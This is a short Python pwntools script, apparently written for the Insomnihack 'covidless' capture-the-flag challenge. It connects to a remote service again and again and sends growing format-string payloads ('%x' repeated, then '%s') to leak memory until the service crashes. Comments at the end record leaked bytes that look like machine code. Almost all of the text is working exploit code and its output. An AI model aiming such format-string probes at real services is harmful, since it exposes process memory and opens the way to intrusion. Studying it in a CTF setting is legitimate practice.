from pwn import *

context.log_level = 'critical'

host, port = 'covidless.insomnihack.ch', 6666

for i in range(1, 110):
    try:
        s = remote(host, port)
        built_str = b"%x " * i
        built_str += b"%s"
        
        s.sendline(built_str)
        
        response = s.recv()
        
        if 'dumped core' in response.decode():
            print('segfault')
            break
        else:
            last_info = response.decode()# .split(" ")[-3]
            print(f"Iteration: {i}, {last_info}")
        s.close()
    except Exception as e:
        print(e)
        breakpoint()
        pass
    
    
# AWAVI\x89\xd7AUATL\x8d%n\x05 \n
# \x89\xc7\xe8\x82\x15\x02 \n
# \x86.\x7f\xfa\xfd\x7f \n
# UH\x89\xe5H\x81\xec\xc0 \n
# 1\xedI\x89\xd1^H\x89\xe2H\x83\xe4\xf0PTI\xc7\xc0 \n
